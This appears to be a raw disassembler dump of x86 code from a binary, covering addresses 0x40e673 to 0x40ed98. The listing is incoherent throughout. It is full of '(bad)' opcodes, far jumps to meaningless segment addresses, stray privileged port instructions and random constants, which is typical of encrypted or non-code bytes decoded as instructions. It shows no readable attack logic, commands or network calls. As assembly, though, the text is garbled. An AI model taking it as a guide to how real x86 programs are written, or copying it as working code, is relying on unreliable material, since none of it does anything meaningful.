  40e673:	xchg   esi,eax
  40e674:	xchg   esi,ecx
  40e676:	fcmovnbe st,st(2)
  40e678:	shl    BYTE PTR [edx+0x6a577148],cl
  40e67e:	inc    ebx
  40e67f:	nop
  40e680:	fbld   TBYTE PTR [edi-0x48]
  40e683:	cmp    al,0xbd
  40e685:	fst    st(2)
  40e687:	add    eax,0x4e3f0a7a
  40e68c:	adc    DWORD PTR [eax+0x73],ebp
  40e68f:	mov    cl,0xd5
  40e691:	jge    0x40e6c9
  40e693:	out    0x79,eax
  40e695:	cmp    cl,BYTE PTR [ecx+0x28]
  40e698:	cmp    edx,DWORD PTR [ebx+edi*4-0x47]
  40e69c:	mov    edx,ebp
  40e69e:	pop    esi
  40e69f:	or     BYTE PTR [ebx+0x5],dh
  40e6a2:	inc    ebx
  40e6a3:	out    dx,eax
  40e6a4:	mov    ebp,0x4da3c99e
  40e6a9:	or     al,0xc6
  40e6ab:	fsubr  QWORD PTR [bp+di+0x2056]
  40e6b0:	mov    al,ds:0x1e21f544
  40e6b5:	lods   al,BYTE PTR ds:[esi]
  40e6b6:	stos   BYTE PTR es:[edi],al
  40e6b7:	push   ss
  40e6b8:	(bad)  
  40e6ba:	lea    esi,[edx+ebx*4]
  40e6bd:	inc    edx
  40e6be:	pop    esi
  40e6bf:	mov    esi,0x915a8522
  40e6c4:	mov    ch,0xe9
  40e6c6:	adc    dh,bl
  40e6c8:	or     BYTE PTR [edi],cl
  40e6ca:	in     al,dx
  40e6cb:	jno    0x40e717
  40e6cd:	jae    0x40e660
  40e6cf:	sub    eax,0x21f9d575
  40e6d4:	lods   al,BYTE PTR ds:[esi]
  40e6d5:	push   cs
  40e6d6:	adc    eax,0x11a678d0
  40e6db:	dec    ebx
  40e6dc:	push   edi
  40e6dd:	gs popf 
  40e6df:	cmp    DWORD PTR [esi-0x79],ebp
  40e6e2:	shl    bl,1
  40e6e4:	push   ss
  40e6e5:	lock fld TBYTE PTR [edi-0x1f243f48]
  40e6ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6ed:	sbb    eax,0x955557aa
  40e6f2:	jbe    0x40e6a1
  40e6f4:	daa    
  40e6f5:	ret    0xe68b
  40e6f8:	mov    ds:0x96dfef54,al
  40e6fd:	test   DWORD PTR [ecx+0x5a],esp
  40e700:	and    BYTE PTR [edx-0xe],cl
  40e703:	jns    0x40e685
  40e705:	fstp   DWORD PTR [edx+0x56]
  40e708:	xlat   BYTE PTR ds:[ebx]
  40e709:	push   edi
  40e70a:	mov    esp,0x53ccb50d
  40e710:	test   al,0x5e
  40e712:	and    DWORD PTR [ebx-0x10],eax
  40e715:	cld    
  40e716:	or     ebx,eax
  40e718:	mov    ch,0x76
  40e71a:	jle    0x40e718
  40e71c:	mov    es,WORD PTR [ebx-0x1d]
  40e71f:	mov    eax,ds:0x98c681c8
  40e724:	sbb    bh,0x1f
  40e727:	xchg   esp,eax
  40e728:	imul   ebx,DWORD PTR [edx-0x5e],0x942fc9eb
  40e72f:	scas   al,BYTE PTR es:[edi]
  40e730:	xchg   esi,eax
  40e731:	dec    edi
  40e732:	mov    ds:0x1ba793d,al
  40e737:	mov    ebp,0xc5a6deed
  40e73c:	adc    eax,0xf6015629
  40e741:	pushf  
  40e742:	addr16 inc ecx
  40e744:	pop    ss
  40e745:	lock xchg ah,ah
  40e748:	(bad)  
  40e749:	push   0x2c
  40e74b:	test   BYTE PTR [ebx+0x4450b560],0x6
  40e752:	or     DWORD PTR [ebx+edi*4-0x4d5585ab],edi
  40e759:	loop   0x40e742
  40e75b:	jo     0x40e7ba
  40e75d:	retf   
  40e75e:	pop    edx
  40e75f:	outs   dx,BYTE PTR ds:[esi]
  40e760:	inc    edx
  40e761:	jmp    0x952d:0x889b41e0
  40e768:	aad    0x76
  40e76a:	out    0xda,al
  40e76c:	add    BYTE PTR [ebp+0x27],0x6d
  40e770:	mov    esp,0xd769545c
  40e775:	mov    bl,0xdc
  40e777:	adc    al,BYTE PTR [ebp-0x55aff96a]
  40e77d:	xlat   BYTE PTR ds:[ebx]
  40e77e:	int3   
  40e77f:	dec    edi
  40e780:	push   ebp
  40e781:	int3   
  40e782:	jo     0x40e7a4
  40e784:	adc    eax,0xce1849ee
  40e789:	je     0x40e7bd
  40e78b:	dec    ecx
  40e78c:	test   BYTE PTR [esi+eax*8-0x6c],dh
  40e790:	test   eax,0xc6fac970
  40e795:	push   edi
  40e796:	or     eax,0xbc27a688
  40e79b:	jmp    0x40e7c3
  40e79d:	jp     0x40e732
  40e79f:	gs nop
  40e7a1:	mov    bh,0x6b
  40e7a3:	sbb    al,0xa8
  40e7a5:	jns    0x40e7d4
  40e7a7:	fisubr WORD PTR [ecx-0x2439343c]
  40e7ad:	div    DWORD PTR [eax-0x7996ffa5]
  40e7b3:	adc    al,0x92
  40e7b5:	nop
  40e7b6:	out    dx,eax
  40e7b7:	cmp    al,0xed
  40e7b9:	push   cs
  40e7ba:	cwde   
  40e7bb:	pusha  
  40e7bc:	mov    ebp,0xbad2ea90
  40e7c1:	mov    al,ds:0xe0a4e16f
  40e7c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7c7:	add    edi,DWORD PTR ds:0xe177c41
  40e7cd:	jecxz  0x40e7fe
  40e7cf:	leave  
  40e7d0:	ror    BYTE PTR [ebp-0x13],0x6a
  40e7d4:	out    dx,al
  40e7d5:	cmp    BYTE PTR [ecx],al
  40e7d7:	or     esp,DWORD PTR [ebp+0x3d26ac4a]
  40e7dd:	js     0x40e792
  40e7df:	arpl   WORD PTR [edi-0x2c],sp
  40e7e2:	inc    edx
  40e7e3:	fcomip st,st(6)
  40e7e5:	jns    0x40e800
  40e7e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7e8:	adc    cl,BYTE PTR [ebx+ecx*4-0xe]
  40e7ec:	pop    es
  40e7ed:	push   ebp
  40e7ee:	pop    ecx
  40e7ef:	sbb    edi,DWORD PTR [ebx]
  40e7f1:	ds aam 0x2
  40e7f4:	push   es
  40e7f5:	mov    ecx,0x308a8a1d
  40e7fa:	xor    eax,0x341a3813
  40e7ff:	and    al,0x4a
  40e801:	sbb    DWORD PTR [ecx+esi*2+0x6f263cc],esi
  40e808:	mov    BYTE PTR [edx+0x1],bl
  40e80b:	sbb    BYTE PTR [ecx+0x1e],ch
  40e80e:	cmp    bh,bl
  40e810:	inc    ebx
  40e811:	jl     0x40e7ee
  40e813:	pusha  
  40e814:	push   edi
  40e815:	(bad)  
  40e816:	jne    0x40e883
  40e818:	dec    esp
  40e819:	arpl   sp,sp
  40e81b:	mov    gs,WORD PTR [ecx+0x71]
  40e81e:	inc    esi
  40e81f:	jae    0x40e86b
  40e821:	int    0xc7
  40e823:	hlt    
  40e824:	in     al,0x6d
  40e826:	and    al,BYTE PTR [eax+0x5ea330fc]
  40e82c:	inc    eax
  40e82d:	mov    dl,0xba
  40e82f:	in     al,0x74
  40e831:	pushf  
  40e832:	or     eax,0xc63c4656
  40e837:	jp     0x40e7bd
  40e839:	inc    esp
  40e83a:	and    ecx,esp
  40e83c:	adc    ebp,edx
  40e83e:	push   edx
  40e83f:	add    bl,ch
  40e841:	fiadd  DWORD PTR [esi-0x741d4270]
  40e847:	sbb    DWORD PTR [edx-0x76],0x4d3157fd
  40e84e:	or     esp,DWORD PTR [ecx]
  40e850:	mov    edx,esp
  40e852:	pop    ds
  40e853:	jle    0x40e87f
  40e855:	pop    ebx
  40e856:	out    dx,al
  40e857:	mov    ds,ebx
  40e859:	ror    DWORD PTR [ecx-0x47f9fd27],cl
  40e85f:	or     DWORD PTR [ebp+edx*1-0x2c],ecx
  40e863:	pop    esi
  40e864:	push   es
  40e865:	jl     0x40e859
  40e867:	aas    
  40e868:	clc    
  40e869:	test   bl,cl
  40e86b:	cdq    
  40e86c:	add    al,BYTE PTR [esi]
  40e86e:	out    0x8d,al
  40e870:	jmp    0x40e8e1
  40e872:	adc    al,0xba
  40e874:	jno    0x40e88b
  40e876:	mov    al,0x2c
  40e878:	cs loop 0x40e87f
  40e87b:	add    cl,BYTE PTR [esi+0x5fd0bd2e]
  40e881:	push   edi
  40e882:	cld    
  40e883:	les    esi,FWORD PTR [eax]
  40e885:	aaa    
  40e886:	sub    BYTE PTR [eax+0x405b2608],bl
  40e88c:	dec    edi
  40e88d:	mov    ebx,0xee763174
  40e892:	cmc    
  40e893:	repnz mov edi,esp
  40e896:	sbb    al,bh
  40e898:	shl    BYTE PTR [esi],0x2a
  40e89b:	mov    eax,0xb2ee6d4d
  40e8a0:	sbb    eax,DWORD PTR [edx]
  40e8a2:	jmp    DWORD PTR [ecx]
  40e8a4:	ins    BYTE PTR es:[edi],dx
  40e8a5:	call   0xc139d664
  40e8aa:	jnp    0x40e898
  40e8ac:	frstor [esi]
  40e8ae:	mov    dh,BYTE PTR [edx+edx*1]
  40e8b1:	in     al,0xca
  40e8b3:	stos   DWORD PTR es:[edi],eax
  40e8b4:	test   DWORD PTR [esi+ecx*4],0xcaeefc42
  40e8bb:	jecxz  0x40e8d3
  40e8bd:	popa   
  40e8be:	jo     0x40e89a
  40e8c0:	sar    DWORD PTR [esi+0x1a11e283],cl
  40e8c6:	fsubr  QWORD PTR ds:0xd4356c85
  40e8cc:	shr    BYTE PTR [esi+ebx*4+0xd65a7e9],cl
  40e8d3:	pavgb  mm4,mm6
  40e8d6:	aaa    
  40e8d7:	sti    
  40e8d8:	xchg   edx,eax
  40e8d9:	sbb    cx,WORD PTR [bp+si-0x27]
  40e8de:	cmp    BYTE PTR [ebx],dh
  40e8e0:	(bad)  
  40e8e1:	popa   
  40e8e2:	test   eax,0xc25e9f58
  40e8e7:	inc    ebp
  40e8e8:	cmp    dl,dh
  40e8ea:	jae    0x40e96b
  40e8ec:	sub    dl,al
  40e8ee:	mov    bl,0x57
  40e8f0:	push   ss
  40e8f1:	fidiv  WORD PTR [esi+ebp*1+0x207288fe]
  40e8f8:	and    al,0x9a
  40e8fa:	xor    al,0x3d
  40e8fc:	push   ds
  40e8fd:	in     eax,dx
  40e8fe:	in     al,dx
  40e8ff:	jno    0x40e8a4
  40e901:	jle    0x40e955
  40e903:	cmp    al,0x1b
  40e905:	fistp  DWORD PTR [edi]
  40e907:	xchg   esp,eax
  40e908:	mov    ebp,ds
  40e90a:	push   es
  40e90b:	sub    dh,dh
  40e90d:	in     eax,0x84
  40e90f:	stos   DWORD PTR es:[edi],eax
  40e910:	pop    esp
  40e911:	inc    ecx
  40e912:	sbb    BYTE PTR [ebp+0xf87a8cf],dl
  40e918:	sub    DWORD PTR [edx-0xd],edi
  40e91b:	dec    eax
  40e91c:	shl    BYTE PTR [ebx+0x6d1048ab],0xbb
  40e923:	jge    0x40e8ee
  40e925:	push   es
  40e926:	adc    ebx,DWORD PTR [ebp+ebp*4-0x7]
  40e92a:	int3   
  40e92b:	push   esi
  40e92c:	xlat   BYTE PTR ds:[ebx]
  40e92d:	int3   
  40e92e:	fnstsw WORD PTR [edi]
  40e930:	sbb    DWORD PTR [edx-0x1b],0x4f
  40e934:	inc    edi
  40e935:	shr    DWORD PTR [ebx-0x5b],0xbf
  40e939:	call   0x52b56ea6
  40e93e:	jb     0x40e9a9
  40e940:	loop   0x40e988
  40e942:	lds    edi,FWORD PTR [esi]
  40e944:	adc    al,0x37
  40e946:	sub    DWORD PTR [edi+0x59f396d1],ecx
  40e94c:	shr    BYTE PTR [eax-0x36],1
  40e94f:	stos   BYTE PTR es:[edi],al
  40e950:	mov    ebx,0x1151258e
  40e955:	call   DWORD PTR [edi]
  40e957:	sub    eax,0xc5643b9
  40e95c:	ror    ebx,1
  40e95e:	adc    BYTE PTR [esi],bl
  40e960:	das    
  40e961:	sbb    bl,BYTE PTR [eax+0x4b]
  40e964:	int3   
  40e965:	pusha  
  40e966:	dec    esp
  40e967:	mov    DWORD PTR [ebx],esi
  40e969:	jl     0x40e953
  40e96b:	fs pop edx
  40e96d:	mov    bl,0x65
  40e96f:	mov    al,0xd2
  40e971:	xchg   esp,eax
  40e972:	or     DWORD PTR [ebx-0x69],esp
  40e975:	inc    edx
  40e976:	dec    esi
  40e977:	loop   0x40e91f
  40e979:	sub    cl,bh
  40e97b:	repnz push ds
  40e97d:	mov    esi,0x9520ef1f
  40e982:	dec    ecx
  40e983:	repz mov al,0xb3
  40e986:	and    ah,dh
  40e988:	cld    
  40e989:	mov    ebp,0x23274ce4
  40e98e:	fsubr  QWORD PTR [eax-0x52]
  40e991:	iret   
  40e992:	inc    esp
  40e993:	daa    
  40e994:	int3   
  40e995:	into   
  40e996:	loop   0x40e97b
  40e998:	or     BYTE PTR cs:[ecx+0x5d3182bd],ch
  40e99f:	rcr    ecx,cl
  40e9a1:	pop    edi
  40e9a2:	cmp    bh,bh
  40e9a4:	sbb    bh,BYTE PTR [edi]
  40e9a6:	in     eax,dx
  40e9a7:	pop    ecx
  40e9a8:	out    dx,al
  40e9a9:	cmp    edx,DWORD PTR [ebx+0x77b42646]
  40e9af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9b0:	dec    eax
  40e9b1:	xor    eax,0x1538b487
  40e9b6:	inc    ecx
  40e9b7:	add    dh,0x9f
  40e9ba:	shl    DWORD PTR [ebp-0xd],1
  40e9bd:	ror    DWORD PTR [ecx+0x3e],0x4a
  40e9c1:	in     eax,0xe9
  40e9c3:	sub    esp,DWORD PTR [esi+0x5e]
  40e9c6:	lahf   
  40e9c7:	inc    esp
  40e9c8:	cmp    al,0x66
  40e9ca:	jecxz  0x40ea32
  40e9cc:	mov    eax,0x2b9a22ba
  40e9d1:	push   es
  40e9d2:	iret   
  40e9d3:	ins    DWORD PTR es:[edi],dx
  40e9d4:	add    bl,ah
  40e9d6:	dec    edx
  40e9d7:	cld    
  40e9d8:	dec    ecx
  40e9d9:	pushf  
  40e9da:	or     al,0x5f
  40e9dc:	xchg   dh,cl
  40e9de:	push   es
  40e9df:	add    bh,ch
  40e9e1:	fucomp st(2)
  40e9e3:	fld    DWORD PTR [ebx]
  40e9e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9e6:	js     0x40ea11
  40e9e8:	lods   eax,DWORD PTR ds:[esi]
  40e9e9:	push   edx
  40e9ea:	jp     0x40e9c6
  40e9ec:	scas   al,BYTE PTR es:[edi]
  40e9ed:	sbb    al,0x54
  40e9ef:	adc    BYTE PTR [ebx-0x51],ah
  40e9f2:	shl    BYTE PTR [edi+eax*4],0x44
  40e9f6:	addr16 pop ebp
  40e9f8:	pushf  
  40e9f9:	push   edi
  40e9fa:	test   al,0x38
  40e9fc:	ja     0x40e9b1
  40e9fe:	(bad)  
  40ea00:	dec    esi
  40ea01:	pop    edx
  40ea02:	pushf  
  40ea03:	stos   BYTE PTR es:[edi],al
  40ea04:	jb     0x40ea0c
  40ea06:	mov    ch,0x86
  40ea08:	sahf   
  40ea09:	jecxz  0x40ea82
  40ea0b:	inc    eax
  40ea0c:	mov    dl,0x4c
  40ea0e:	jle    0x40ea3e
  40ea10:	add    al,0xa5
  40ea12:	scas   eax,DWORD PTR es:[edi]
  40ea13:	addr16 sbb eax,0x798dd283
  40ea19:	push   ds
  40ea1a:	call   DWORD PTR fs:[ebx-0x3df6fc17]
  40ea21:	aas    
  40ea22:	mov    ds:0x4d89a79a,eax
  40ea27:	out    dx,eax
  40ea28:	pusha  
  40ea29:	neg    DWORD PTR ds:0x88e3ae17
  40ea2f:	add    DWORD PTR [ecx],edx
  40ea31:	pushf  
  40ea32:	sbb    al,0xb4
  40ea34:	hlt    
  40ea35:	stc    
  40ea36:	push   esp
  40ea37:	jno    0x40e9e7
  40ea39:	scas   eax,DWORD PTR es:[edi]
  40ea3a:	jb     0x40ea80
  40ea3c:	cmc    
  40ea3d:	inc    ebx
  40ea3e:	add    edi,ecx
  40ea40:	loope  0x40ea02
  40ea42:	xor    bh,ah
  40ea44:	mov    ds:0x85d51b43,eax
  40ea49:	retf   
  40ea4a:	sar    DWORD PTR [eax],1
  40ea4c:	xchg   esi,eax
  40ea4d:	xchg   ebp,eax
  40ea4e:	and    esp,DWORD PTR [esi]
  40ea50:	or     eax,0xec776bdf
  40ea55:	mov    ebx,0x8e538160
  40ea5a:	loope  0x40ea76
  40ea5c:	(bad)  
  40ea5d:	(bad)  
  40ea5e:	ins    DWORD PTR es:[edi],dx
  40ea5f:	fnstenv [edx]
  40ea61:	outs   dx,DWORD PTR ds:[esi]
  40ea62:	inc    ebp
  40ea63:	lahf   
  40ea64:	bound  esp,QWORD PTR [ecx+eax*4]
  40ea67:	ss iret 
  40ea69:	(bad)  
  40ea6a:	cmp    eax,0xfaa3543c
  40ea6f:	iret   
  40ea70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea71:	das    
  40ea72:	call   0x72e5:0xb6a4df64
  40ea79:	(bad)  
  40ea7a:	mov    BYTE PTR [eax+0x6c44b981],bh
  40ea80:	mov    ecx,DWORD PTR [eax-0x2c]
  40ea83:	sti    
  40ea84:	call   0x6679cd3b
  40ea89:	add    DWORD PTR [esi+0x20],esi
  40ea8c:	int    0x7d
  40ea8e:	sub    eax,0x9706882d
  40ea93:	sahf   
  40ea94:	xlat   BYTE PTR ds:[ebx]
  40ea95:	addr16 aad 0x38
  40ea98:	push   ebx
  40ea99:	sub    eax,0x847677ec
  40ea9e:	loopne 0x40ea97
  40eaa0:	xor    DWORD PTR [edi],edx
  40eaa2:	push   ecx
  40eaa3:	push   ds
  40eaa4:	xor    edi,esp
  40eaa6:	lods   eax,DWORD PTR ds:[esi]
  40eaa7:	retf   
  40eaa8:	in     al,0x1d
  40eaaa:	(bad)  
  40eaab:	mov    ds:0x7e89f8d4,eax
  40eab0:	rol    eax,0x1e
  40eab3:	(bad)  
  40eab4:	ins    DWORD PTR es:[edi],dx
  40eab5:	jle    0x40eab8
  40eab7:	test   BYTE PTR [edx-0x13e3ae3f],cl
  40eabd:	adc    esp,DWORD PTR [ebp*2-0x1a1d1796]
  40eac4:	adc    esp,ebx
  40eac6:	inc    eax
  40eac7:	cs jecxz 0x40eb19
  40eaca:	pop    eax
  40eacb:	push   ebp
  40eacc:	fs (bad) 
  40eace:	adc    BYTE PTR [ebx+ecx*4-0x54d6c45a],ah
  40ead5:	test   DWORD PTR [ebp+0x17],eax
  40ead8:	imul   esp,DWORD PTR [ecx],0xc44dcd36
  40eade:	call   0x25f4:0x83cdcc21
  40eae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eae6:	pusha  
  40eae7:	xor    DWORD PTR [eax-0x5],ebx
  40eaea:	clc    
  40eaeb:	stos   BYTE PTR es:[edi],al
  40eaec:	loop   0x40ea7e
  40eaee:	jmp    0x8d3d526d
  40eaf3:	icebp  
  40eaf4:	jecxz  0x40eac6
  40eaf6:	mov    ecx,0xfcf4445d
  40eafb:	jae    0x40eb4c
  40eafd:	fistp  DWORD PTR [ebp+0x21]
  40eb00:	inc    edi
  40eb01:	hlt    
  40eb02:	sub    ah,0x22
  40eb05:	inc    ecx
  40eb06:	cmp    DWORD PTR [edi+0x46406497],ecx
  40eb0c:	inc    esp
  40eb0d:	sbb    DWORD PTR [ebx+0x75],edx
  40eb10:	pop    ecx
  40eb11:	out    0x9a,al
  40eb13:	test   BYTE PTR [eax],cl
  40eb15:	xchg   edi,eax
  40eb16:	aad    0xd1
  40eb18:	cwde   
  40eb19:	jmp    0x146c:0x2ba2525b
  40eb20:	arpl   WORD PTR [esi+ebp*2],bx
  40eb23:	xchg   edx,eax
  40eb24:	or     al,0xc6
  40eb26:	test   cl,bh
  40eb28:	arpl   WORD PTR [edi+0x35],sp
  40eb2b:	xor    ah,BYTE PTR [edx-0x1]
  40eb2e:	push   cs
  40eb2f:	arpl   WORD PTR [eax],di
  40eb31:	sub    al,0x69
  40eb33:	adc    BYTE PTR [ebx+0x14717637],ah
  40eb39:	daa    
  40eb3a:	sbb    eax,0x2f1755f9
  40eb3f:	xlat   BYTE PTR ds:[ebx]
  40eb40:	jmp    0x693b:0xd5c50568
  40eb47:	add    ch,BYTE PTR [ecx+0x739e9b00]
  40eb4d:	mov    BYTE PTR [esi+0x2f170afe],0x82
  40eb54:	mov    ds:0x80ba0fe2,eax
  40eb59:	fild   WORD PTR [ebp+0x23]
  40eb5c:	inc    edx
  40eb5d:	jmp    DWORD PTR [ecx-0x32]
  40eb60:	mov    eax,ds:0x4e8567d4
  40eb65:	mov    ebx,DWORD PTR [edi-0x72]
  40eb68:	leave  
  40eb69:	mov    edi,0xa2ae382f
  40eb6e:	mov    ch,0x56
  40eb70:	fwait
  40eb71:	call   0x726f:0x43add83b
  40eb78:	mov    ss,edx
  40eb7a:	cmc    
  40eb7b:	dec    edx
  40eb7c:	and    al,al
  40eb7e:	fldl2e 
  40eb80:	fcomp  DWORD PTR [ebp+0x42f7992a]
  40eb86:	sbb    al,0x60
  40eb88:	push   esp
  40eb89:	mov    eax,0xe52a6fa9
  40eb8e:	sbb    edi,DWORD PTR [ecx+ecx*1+0x103d589a]
  40eb95:	xchg   ebp,eax
  40eb96:	inc    ebx
  40eb97:	xor    ah,BYTE PTR [esi+0x15353b80]
  40eb9d:	aad    0x38
  40eb9f:	mov    al,0xc5
  40eba1:	pushf  
  40eba2:	push   cs
  40eba3:	cwde   
  40eba4:	sbb    BYTE PTR [ecx+0x1c],ah
  40eba7:	outs   dx,DWORD PTR ds:[esi]
  40eba8:	mov    edx,0x1df0254a
  40ebad:	mov    WORD PTR [ebx-0x41],fs
  40ebb0:	fsubr  DWORD PTR [eax*8-0x2841d903]
  40ebb7:	cmp    eax,ecx
  40ebb9:	sahf   
  40ebba:	sub    bh,BYTE PTR ds:0xd6b25160
  40ebc0:	add    dh,BYTE PTR [edx]
  40ebc2:	push   ebp
  40ebc3:	jle    0x40ec05
  40ebc5:	into   
  40ebc6:	das    
  40ebc7:	adc    esp,DWORD PTR [edi]
  40ebc9:	loopne 0x40eb6b
  40ebcb:	inc    ebx
  40ebcc:	cmp    DWORD PTR [edi+esi*4],edi
  40ebcf:	mov    bl,0x45
  40ebd1:	push   ecx
  40ebd2:	lods   al,BYTE PTR ds:[esi]
  40ebd3:	cmc    
  40ebd4:	out    0x68,eax
  40ebd6:	out    0xe9,al
  40ebd8:	jmp    DWORD PTR [edx]
  40ebda:	pop    eax
  40ebdb:	aaa    
  40ebdc:	and    DWORD PTR [ecx+eax*4+0x6],esi
  40ebe0:	test   al,0xaf
  40ebe2:	test   DWORD PTR [esi],ebp
  40ebe4:	into   
  40ebe5:	inc    ecx
  40ebe6:	dec    esi
  40ebe7:	xchg   BYTE PTR [ecx],ch
  40ebe9:	test   al,0x0
  40ebeb:	sbb    BYTE PTR [eax-0x624a093e],dh
  40ebf1:	call   0x68758136
  40ebf6:	mov    cl,0x29
  40ebf8:	jle    0x40ec1f
  40ebfa:	fs pushaw 
  40ebfd:	sti    
  40ebfe:	and    BYTE PTR [ecx+0x7fdf8a95],bl
  40ec04:	mov    ch,0x6
  40ec06:	fadd   st(5),st
  40ec08:	pop    ebx
  40ec09:	mov    es,WORD PTR [ebx+0x56d10eda]
  40ec0f:	je     0x40ec4b
  40ec11:	inc    ebp
  40ec12:	sbb    al,0x54
  40ec14:	adc    BYTE PTR fs:[bx+si],dl
  40ec18:	jnp    0x40ec12
  40ec1a:	push   ds
  40ec1b:	pop    esp
  40ec1c:	sub    esi,DWORD PTR [ebp-0x682e193e]
  40ec22:	(bad)  
  40ec23:	(bad)  
  40ec24:	fmul   st(3),st
  40ec26:	retf   
  40ec27:	mov    BYTE PTR [edx-0x3f],dh
  40ec2a:	jl     0x40ec29
  40ec2c:	cmc    
  40ec2d:	and    dh,BYTE PTR [eax-0x582b2c17]
  40ec33:	push   cs
  40ec34:	push   edi
  40ec35:	fld    TBYTE PTR [edi+ebx*2+0x129c7bc4]
  40ec3c:	in     al,0x2b
  40ec3e:	test   DWORD PTR [edx],ebp
  40ec40:	outs   dx,BYTE PTR ds:[esi]
  40ec41:	loop   0x40eca6
  40ec43:	mov    WORD PTR [edi-0x9],?
  40ec46:	push   edx
  40ec47:	ins    DWORD PTR es:[edi],dx
  40ec48:	inc    edi
  40ec49:	xlat   BYTE PTR ds:[ebx]
  40ec4a:	outs   dx,BYTE PTR ds:[esi]
  40ec4b:	mov    ebp,0xb51cc472
  40ec50:	dec    ebx
  40ec51:	push   esi
  40ec53:	xchg   esi,eax
  40ec54:	fisttp DWORD PTR [ecx-0x38c40ba]
  40ec5a:	jge    0x40ecdb
  40ec5c:	push   0x2f
  40ec5e:	jmp    0x40ec3a
  40ec60:	or     BYTE PTR [edi+0x42],ch
  40ec63:	out    0xdc,eax
  40ec65:	mov    ebx,0x4c410b
  40ec6a:	imul   edi,ebp,0xbd9d519e
  40ec70:	mov    al,0x44
  40ec72:	xchg   esi,eax
  40ec73:	sbb    al,0x99
  40ec75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec76:	daa    
  40ec77:	outs   dx,DWORD PTR ds:[esi]
  40ec78:	aad    0x19
  40ec7a:	mov    dh,0xbd
  40ec7c:	daa    
  40ec7d:	lods   al,BYTE PTR ds:[esi]
  40ec7e:	loop   0x40ece4
  40ec80:	mov    edx,DWORD PTR [ecx]
  40ec82:	out    0xd7,eax
  40ec84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec85:	sbb    eax,0xfb5ed5ef
  40ec8a:	inc    eax
  40ec8b:	mov    edx,0x669fc43b
  40ec90:	cli    
  40ec91:	jb     0x40ecd0
  40ec93:	mov    WORD PTR ds:0x2db02dfc,gs
  40ec99:	sub    eax,DWORD PTR [edi]
  40ec9b:	sbb    eax,0x19dd7af9
  40eca0:	pop    ecx
  40eca1:	cdq    
  40eca2:	mov    gs,WORD PTR [ebx]
  40eca4:	lahf   
  40eca5:	jno    0x40eca3
  40eca7:	sbb    cl,ch
  40eca9:	add    al,BYTE PTR [esi+0x24185631]
  40ecaf:	xchg   esp,eax
  40ecb0:	xor    DWORD PTR [eax-0xc505805],ebx
  40ecb6:	gs dec ebx
  40ecb8:	out    0x5b,al
  40ecba:	ret    0x79ec
  40ecbd:	iret   
  40ecbe:	cld    
  40ecbf:	in     eax,dx
  40ecc0:	dec    ebp
  40ecc1:	aad    0x85
  40ecc3:	add    BYTE PTR [esi+0x2d234411],cl
  40ecc9:	in     eax,dx
  40ecca:	dec    edi
  40eccb:	or     dh,BYTE PTR [ebx]
  40eccd:	stc    
  40ecce:	push   esp
  40eccf:	add    ebp,ebp
  40ecd1:	lahf   
  40ecd2:	ffree  st(5)
  40ecd4:	push   ebp
  40ecd5:	sahf   
  40ecd6:	sbb    al,0x44
  40ecd8:	sbb    BYTE PTR [ebp+0xf777c95],ah
  40ecde:	add    eax,0x3ba1cd36
  40ece3:	or     al,0x43
  40ece5:	repz bound ebx,QWORD PTR [ebx]
  40ece8:	ret    0x98c3
  40eceb:	mov    ecx,0xa393fbc8
  40ecf0:	push   ecx
  40ecf1:	loope  0x40ec9b
  40ecf3:	ret    0xfc0
  40ecf6:	sbb    DWORD PTR ds:[ebp+0x49],0xffffffce
  40ecfb:	cmp    dh,ch
  40ecfd:	inc    esp
  40ecfe:	retf   
  40ecff:	lds    esi,FWORD PTR [ebx-0x58]
  40ed02:	(bad)  
  40ed03:	push   0xffffffcf
  40ed05:	fwait
  40ed06:	mov    bl,0xe5
  40ed08:	loop   0x40eca5
  40ed0a:	cld    
  40ed0b:	retf   
  40ed0c:	jne    0x40ed4d
  40ed0e:	fiadd  DWORD PTR [esi+0x718e145f]
  40ed14:	mov    ebx,0xb39fe77f
  40ed19:	hlt    
  40ed1a:	pop    esp
  40ed1b:	cli    
  40ed1c:	push   esi
  40ed1d:	adc    al,0x77
  40ed1f:	mov    ch,0xa7
  40ed21:	int    0xd3
  40ed23:	fmul   st,st(2)
  40ed25:	call   0xd310:0x1a1f052
  40ed2c:	sar    DWORD PTR [eax+0xe],1
  40ed2f:	sahf   
  40ed30:	cmp    DWORD PTR [eax+0x30],ebx
  40ed33:	js     0x40ed62
  40ed35:	or     DWORD PTR [edx],ecx
  40ed37:	jne    0x40ed64
  40ed39:	hlt    
  40ed3a:	dec    esi
  40ed3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed3c:	fdivr  QWORD PTR [edx]
  40ed3e:	jb     0x40ed1f
  40ed40:	aas    
  40ed41:	out    0xb6,al
  40ed43:	lds    esi,FWORD PTR [edx+0x25]
  40ed46:	dec    esp
  40ed47:	cmc    
  40ed48:	imul   ebp,edi,0x6b3fd69c
  40ed4e:	inc    ecx
  40ed4f:	cli    
  40ed50:	jle    0x40ed95
  40ed52:	loopne 0x40ed79
  40ed54:	jmp    0x40ed8e
  40ed56:	cmp    BYTE PTR [ecx],dl
  40ed58:	adc    DWORD PTR [eax],esp
  40ed5a:	imul   edx,DWORD PTR [esi],0x6
  40ed5d:	imul   esp,DWORD PTR [ecx-0x5a],0x29b763bb
  40ed64:	repnz mov al,0xec
  40ed67:	int    0xf6
  40ed69:	ds mov ebp,0x60e1379c
  40ed6f:	(bad)  
  40ed71:	push   es
  40ed72:	jmp    0xb7c6:0xbced6c89
  40ed79:	stos   DWORD PTR es:[edi],eax
  40ed7a:	arpl   WORD PTR [ecx+0x29],sp
  40ed7d:	and    al,0x2
  40ed7f:	fwait
  40ed80:	push   0xffffffd3
  40ed82:	loop   0x40ee02
  40ed84:	mov    bl,0x7b
  40ed86:	pop    esi
  40ed87:	pop    es
  40ed88:	mul    ebp
  40ed8a:	data16 sar BYTE PTR [edi],cl
  40ed8d:	mov    edi,0x3b3218a2
  40ed92:	gs mov eax,0x9071742
  40ed98:	mov    bl,0xd9
